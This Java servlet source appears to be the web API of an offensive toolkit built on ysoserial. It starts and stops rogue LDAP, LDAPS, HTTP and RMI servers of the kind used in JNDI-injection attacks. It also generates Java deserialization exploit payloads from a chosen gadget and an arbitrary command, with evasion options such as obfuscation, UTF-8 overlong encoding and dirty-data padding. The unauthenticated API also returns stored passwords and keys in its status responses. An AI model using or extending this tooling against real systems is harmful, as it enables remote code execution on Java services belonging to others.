package com.qi4l.JYso.web;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.qi4l.JYso.HTTPServer;
import com.qi4l.JYso.LdapServer;
import com.qi4l.JYso.LdapsServer;
import com.qi4l.JYso.RMIServer;
import com.qi4l.JYso.Starter;
import com.qi4l.JYso.gadgets.Config.Config;
import com.qi4l.JYso.gadgets.Config.ysoserial;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.*;

public class JettyApiServlet extends HttpServlet {

    @Override
    protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        resp.setContentType("application/json");
        resp.setCharacterEncoding("UTF-8");

        String path = req.getRequestURI();
        if (path.startsWith("/api/")) {
            path = path.substring(4);
        }

        try {
            if ("/status".equals(path) && "GET".equalsIgnoreCase(req.getMethod())) {
                handleStatus(resp);
            } else if ("/servers/start".equals(path) && "POST".equalsIgnoreCase(req.getMethod())) {
                handleServersStart(req, resp);
            } else if ("/servers/stop".equals(path) && "POST".equalsIgnoreCase(req.getMethod())) {
                handleServersStop(req, resp);
            } else if ("/servers/toggle".equals(path) && "POST".equalsIgnoreCase(req.getMethod())) {
                handleServersToggle(req, resp);
            } else if ("/gadgets".equals(path) && "GET".equalsIgnoreCase(req.getMethod())) {
                handleGadgets(resp);
            } else if ("/payload/generate".equals(path) && "POST".equalsIgnoreCase(req.getMethod())) {
                handlePayloadGenerate(req, resp);
            } else if ("/config/update".equals(path) && "POST".equalsIgnoreCase(req.getMethod())) {
                handleConfigUpdate(req, resp);
            } else if ("/config".equals(path) && "GET".equalsIgnoreCase(req.getMethod())) {
                handleStatus(resp);
            } else if ("/logs".equals(path) && "GET".equalsIgnoreCase(req.getMethod())) {
                handleLogs(req, resp);
            } else {
                resp.setStatus(404);
                resp.getWriter().write("{\"error\":\"Not found\"}");
            }
        } catch (Exception e) {
            resp.setStatus(500);
            resp.getWriter().write("{\"success\":false,\"error\":\"" + escapeJson(e.getMessage()) + "\"}");
        }
    }

    private void handleStatus(HttpServletResponse resp) throws IOException {
        Map<String, Object> status = new LinkedHashMap<>();
        status.put("ldapRunning", LdapServer.isRunning);
        status.put("ldapsRunning", LdapsServer.isRunning);
        status.put("httpRunning", HTTPServer.isRunning);
        status.put("rmiRunning", RMIServer.isRunning);
        status.put("ip", Config.ip);
        status.put("ldapPort", Config.ldapPort);
        status.put("ldapsPort", Config.ldapsPort);
        status.put("httpPort", Config.httpPort);
        status.put("rmiPort", Config.rmiPort);
        status.put("codeBase", Config.codeBase);
        status.put("AESkey", Config.AESkey);
        status.put("user", Config.USER);
        status.put("PASSWD", Config.PASSWD);
        status.put("TLSProxy", Config.TLSProxy);
        status.put("keyPass", Config.keyPass);
        status.put("certFile", Config.certFile);
        status.put("version", "1.3.8");
        resp.getWriter().write(JSON.toJSONString(status));
    }

    private void handleLogs(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        int count = 100;
        String countParam = req.getParameter("count");
        if (countParam != null) {
            try { count = Integer.parseInt(countParam); } catch (NumberFormatException ignored) {}
        }
        List<String> logLines = RequestLogCollector.getLines(count);
        Map<String, Object> result = new LinkedHashMap<>();
        result.put("logs", logLines);
        resp.getWriter().write(JSON.toJSONString(result));
    }

    private void handleServersStart(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        JSONObject json = readJson(req);
        Map<String, Object> result = new LinkedHashMap<>();
        List<String> started = new ArrayList<>();
        List<String> errors = new ArrayList<>();

        boolean startLdap = json.getBooleanValue("ldap");
        boolean startLdaps = json.getBooleanValue("ldaps");
        boolean startHttp = json.getBooleanValue("http");
        boolean startRmi = json.getBooleanValue("rmi");

        if (json.containsKey("ip")) Config.ip = json.getString("ip");
        if (json.containsKey("ldapPort")) Config.ldapPort = json.getIntValue("ldapPort");
        if (json.containsKey("ldapsPort")) Config.ldapsPort = json.getIntValue("ldapsPort");
        if (json.containsKey("httpPort")) Config.httpPort = json.getIntValue("httpPort");
        if (json.containsKey("rmiPort")) Config.rmiPort = json.getIntValue("rmiPort");

        if (startLdap && !LdapServer.isRunning) {
            new Thread(() -> { try { LdapServer.start(); } catch (Exception ignored) {} }, "ldap-starter").start();
            started.add("LDAP");
        }
        if (startHttp && !HTTPServer.isRunning) {
            new Thread(() -> { try { HTTPServer.start(); } catch (Exception ignored) {} }, "http-starter").start();
            started.add("HTTP");
        }
        if (startLdaps && !LdapsServer.isRunning) {
            new Thread(() -> { try { LdapsServer.start(); } catch (Exception ignored) {} }, "ldaps-starter").start();
            started.add("LDAPS");
        }
        if (startRmi && !RMIServer.isRunning) {
            new Thread(() -> { try { RMIServer.start(); } catch (Exception ignored) {} }, "rmi-starter").start();
            started.add("RMI");
        }

        result.put("started", started);
        result.put("errors", errors);
        result.put("success", true);
        resp.getWriter().write(JSON.toJSONString(result));
    }

    private void handleServersStop(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        JSONObject json = readJson(req);
        Map<String, Object> result = new LinkedHashMap<>();
        String server = json.getString("server");
        if (server == null) {
            result.put("success", false);
            result.put("error", "server name required");
            resp.getWriter().write(JSON.toJSONString(result));
            return;
        }
        switch (server.toLowerCase()) {
            case "ldap": LdapServer.stop(); break;
            case "ldaps": LdapsServer.stop(); break;
            case "http": HTTPServer.stop(); break;
            case "rmi": RMIServer.stop(); break;
            default:
                result.put("success", false);
                result.put("error", "unknown server: " + server);
                resp.getWriter().write(JSON.toJSONString(result));
                return;
        }
        result.put("success", true);
        result.put("server", server);
        result.put("status", buildStatusMap());
        resp.getWriter().write(JSON.toJSONString(result));
    }

    private void handleServersToggle(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        JSONObject json = readJson(req);
        Map<String, Object> result = new LinkedHashMap<>();
        String server = json.getString("server");
        if (server == null) {
            result.put("success", false);
            result.put("error", "server name required");
            resp.getWriter().write(JSON.toJSONString(result));
            return;
        }
        boolean nowRunning;
        switch (server.toLowerCase()) {
            case "ldap":
                if (LdapServer.isRunning) LdapServer.stop();
                else new Thread(() -> { try { LdapServer.start(); } catch (Exception ignored) {} }, "ldap-toggler").start();
                nowRunning = !LdapServer.isRunning;
                break;
            case "ldaps":
                if (LdapsServer.isRunning) LdapsServer.stop();
                else new Thread(() -> { try { LdapsServer.start(); } catch (Exception ignored) {} }, "ldaps-toggler").start();
                nowRunning = !LdapsServer.isRunning;
                break;
            case "http":
                if (HTTPServer.isRunning) HTTPServer.stop();
                else new Thread(() -> { try { HTTPServer.start(); } catch (Exception ignored) {} }, "http-toggler").start();
                nowRunning = !HTTPServer.isRunning;
                break;
            case "rmi":
                if (RMIServer.isRunning) RMIServer.stop();
                else new Thread(() -> { try { RMIServer.start(); } catch (Exception ignored) {} }, "rmi-toggler").start();
                nowRunning = !RMIServer.isRunning;
                break;
            default:
                result.put("success", false);
                result.put("error", "unknown server: " + server);
                resp.getWriter().write(JSON.toJSONString(result));
                return;
        }
        try { Thread.sleep(800); } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
        result.put("success", true);
        result.put("server", server);
        result.put("running", nowRunning);
        result.put("status", buildStatusMap());
        resp.getWriter().write(JSON.toJSONString(result));
    }

    private void handleGadgets(HttpServletResponse resp) throws IOException {
        List<Map<String, Object>> list = new ArrayList<>();
        for (String name : Starter.caseInsensitiveObjectPayloadMap.keySet()) {
            Map<String, Object> item = new LinkedHashMap<>();
            String shortName = name.substring(name.lastIndexOf('.') + 1);
            item.put("name", shortName);
            item.put("fullName", name);
            list.add(item);
        }
        resp.getWriter().write(JSON.toJSONString(list));
    }

    private void handlePayloadGenerate(HttpServletRequest req, HttpServletResponse resp) throws Exception {
        JSONObject json = readJson(req);
        Map<String, Object> result = new LinkedHashMap<>();

        String gadget = json.getString("gadget");
        String command = json.getString("command");
        String saveFilename = json.getString("filename");
        boolean encodeBase64 = json.getBooleanValue("encodeBase64");

        if (gadget == null || command == null) {
            result.put("success", false);
            result.put("error", "gadget and command are required");
            resp.getWriter().write(JSON.toJSONString(result));
            return;
        }

        boolean keepFile = (saveFilename != null && !saveFilename.trim().isEmpty());
        String filename = keepFile ? saveFilename.trim() : "1.ser";

        java.util.List<String> argList = new java.util.ArrayList<>();
        argList.add("-y");
        argList.add("-g");
        argList.add(gadget);
        argList.add("-p");
        argList.add(command);
        argList.add("-f");
        argList.add(filename);

        if (json.getBooleanValue("inherit")) argList.add("-i");
        if (json.getBooleanValue("obscure")) argList.add("-o");
        if (json.getBooleanValue("noComSun")) argList.add("-ncs");
        if (json.getBooleanValue("mozillaClassLoader")) argList.add("-mcl");
        if (json.getBooleanValue("rhino")) argList.add("-rh");
        if (json.getBooleanValue("utf8Overlong")) argList.add("-utf");

        String dcfpVal = json.getString("dcfp");
        if (dcfpVal != null && !dcfpVal.trim().isEmpty()) {
            argList.add("-dcfp");
            argList.add(dcfpVal.trim());
        }

        String dirtyTypeVal = json.getString("dirtyType");
        String dirtyLengthVal = json.getString("dirtyLength");
        if (dirtyTypeVal != null && !dirtyTypeVal.trim().isEmpty()
                && dirtyLengthVal != null && !dirtyLengthVal.trim().isEmpty()) {
            argList.add("-dt");
            argList.add(dirtyTypeVal.trim());
            argList.add("-dl");
            argList.add(dirtyLengthVal.trim());
        }

        ysoserial.run(argList.toArray(new String[0]));

        Path filePath = Paths.get(filename);
        byte[] data = Files.readAllBytes(filePath);

        result.put("success", true);
        if (encodeBase64) {
            String b64 = Base64.getEncoder().encodeToString(data);
            result.put("message", b64);
            if (keepFile) {
                Files.write(filePath, b64.getBytes());
            }
        } else {
            StringBuilder hex = new StringBuilder();
            for (byte b : data) {
                hex.append(String.format("%02x", b));
            }
            result.put("message", hex.toString());
        }
        if (!keepFile) {
            Files.deleteIfExists(filePath);
        }
        if (keepFile) {
            result.put("saved", filename);
        }
        resp.getWriter().write(JSON.toJSONString(result));
    }

    private void handleConfigUpdate(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        JSONObject json = readJson(req);
        Map<String, Object> result = new LinkedHashMap<>();

        if (json.containsKey("ip")) Config.ip = json.getString("ip");
        if (json.containsKey("ldapPort")) Config.ldapPort = json.getIntValue("ldapPort");
        if (json.containsKey("ldapsPort")) Config.ldapsPort = json.getIntValue("ldapsPort");
        if (json.containsKey("httpPort")) Config.httpPort = json.getIntValue("httpPort");
        if (json.containsKey("rmiPort")) Config.rmiPort = json.getIntValue("rmiPort");
        if (json.containsKey("codeBase")) Config.codeBase = json.getString("codeBase");
        if (json.containsKey("AESkey")) Config.AESkey = json.getString("AESkey");
        if (json.containsKey("user")) Config.USER = json.getString("user");
        if (json.containsKey("PASSWD")) Config.PASSWD = json.getString("PASSWD");
        if (json.containsKey("TLSProxy")) Config.TLSProxy = json.getBooleanValue("TLSProxy");
        if (json.containsKey("keyPass")) Config.keyPass = json.getString("keyPass");
        if (json.containsKey("certFile")) Config.certFile = json.getString("certFile");

        result.put("success", true);
        result.put("config", buildStatusMap());
        resp.getWriter().write(JSON.toJSONString(result));
    }

    private Map<String, Object> buildStatusMap() {
        Map<String, Object> status = new LinkedHashMap<>();
        status.put("ldapRunning", LdapServer.isRunning);
        status.put("ldapsRunning", LdapsServer.isRunning);
        status.put("httpRunning", HTTPServer.isRunning);
        status.put("rmiRunning", RMIServer.isRunning);
        status.put("ip", Config.ip);
        status.put("ldapPort", Config.ldapPort);
        status.put("ldapsPort", Config.ldapsPort);
        status.put("httpPort", Config.httpPort);
        status.put("rmiPort", Config.rmiPort);
        status.put("codeBase", Config.codeBase);
        status.put("AESkey", Config.AESkey);
        status.put("user", Config.USER);
        status.put("PASSWD", Config.PASSWD);
        status.put("TLSProxy", Config.TLSProxy);
        status.put("keyPass", Config.keyPass);
        status.put("certFile", Config.certFile);
        status.put("version", "1.3.8");
        return status;
    }

    private JSONObject readJson(HttpServletRequest req) throws IOException {
        StringBuilder sb = new StringBuilder();
        try (BufferedReader reader = req.getReader()) {
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line);
            }
        }
        String body = sb.toString();
        if (body.isEmpty()) return new JSONObject();
        return JSON.parseObject(body);
    }

    private String escapeJson(String s) {
        if (s == null) return "null";
        return s.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }
}
